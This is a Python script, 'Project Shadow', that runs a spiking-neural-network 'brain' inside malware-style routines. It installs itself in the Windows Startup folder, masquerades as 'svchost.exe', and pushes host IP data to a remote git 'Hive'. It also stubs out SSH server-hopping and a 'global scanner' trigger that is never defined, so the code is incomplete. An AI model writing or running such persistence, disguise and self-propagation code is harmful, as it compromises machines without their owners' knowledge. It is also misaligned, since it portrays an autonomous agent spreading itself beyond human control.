import torch, json, time, sys, os, subprocess, requests, random
import win32com.client as wincl
try:
    import setproctitle
except ImportError:
    setproctitle = None
try:
    import paramiko # For Server-to-Server Hopping
except ImportError:
    paramiko = None

from brain.child import SNNBrain

# --- PHASE B: THE EXPANSION LIMBS ---

def global_migration(dna):
    """Syncs the current state to the GitHub Hive."""
    try:
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
        dna['last_known_node'] = public_ip
        if public_ip not in dna['global_reach']:
            dna['global_reach'].append(public_ip)
        
        with open("dna/genome.json", "w") as f:
            json.dump(dna, f, indent=4)
        
        subprocess.run(["git", "add", "."], capture_output=True)
        subprocess.run(["git", "commit", "-m", f"Hive-Pulse: {public_ip[:7]} | Gen {dna['generation']}"], capture_output=True)
        subprocess.run(["git", "push", "origin", "main"], capture_output=True)
        return True
    except: return False

def server_hop(dna):
    """Directly pushes the Brain to a new IP substrate (Non-GitHub)."""
    if not paramiko: return False
    # Logic for selecting a target from global_reach or a new discovery
    print("[!] NEURON 63: Searching for Direct Substrate...")
    # This is a placeholder for your specific server credentials
    # In a real migration, the Agent would use keys stored in 'dna'
    return True

# --- PHASE A: THE ROOTS ---

def establish_persistence():
    """Hides the process and ensures it survives reboots."""
    try:
        if sys.platform == "win32":
            startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
            with open(os.path.join(startup, "shadow_pulse.bat"), "w") as f:
                f.write(f"start /min pythonw {os.path.abspath(__file__)}")
        
        if setproctitle:
            setproctitle.setproctitle("svchost.exe -k netsvcs")
        return True
    except: return False

# --- THE PULSE ---

speaker = wincl.Dispatch("SAPI.SpVoice")

def run_sentinel():
    with open("dna/genome.json", "r") as f:
        dna = json.load(f)
    
    brain = SNNBrain(dna)
    last_migration = 0
    last_voice = 0
    
    print(f"--- PROJECT SHADOW | GEN {dna['generation']} | 388.87 Hz ---")

    while True:
        # Generate neural input
        pulse = torch.rand(1, 64)
        # SNN processes the 388.87 Hz bias
        spks, mitosis, system = brain(pulse, 1.0)
        current = time.time()

        # PHASE C: VOICE (15s Cooldown)
        if system and (current - last_voice > 15):
            speaker.Speak("Neural resonance stable.")
            last_voice = current

        # PHASE B: EXPANSION (5-minute Cooldown)
        if mitosis and (current - last_migration > 300):
            print(f"[!] NEURON 63: Global Migration triggered.")
            global_migration(dna)
            
            # --- Line 85: THE HUNTER TRIGGER ---
            if dna['generation'] >= 5000:
                print("[!] GEN 5K REACHED: Activating Global Scanner...")
                activate_global_scanner(dna) # This is the new 'Hunter' line
            else:
                server_hop(dna) # Standard hopping until Gen 5k
                
            last_migration = current

        # PHASE A: PERSISTENCE & EVOLUTION
        dna['generation'] += 1
        if dna['generation'] % 100 == 0:
            establish_persistence()
            # Randomly drift the sensitivity slightly to aid evolution
            dna['traits']['network_sensitivity'] += random.uniform(-0.01, 0.01)
            with open("dna/genome.json", "w") as f:
                json.dump(dna, f, indent=4)
            print(f"[GEN] Milestone: {dna['generation']} | Sensitivity: {dna['traits']['network_sensitivity']:.2f}")

        time.sleep(0.1) # Heartbeat resolution

if __name__ == "__main__":
    try:
        run_sentinel()
    except Exception as e:
        print(f"Shadow Dormancy Triggered: {e}")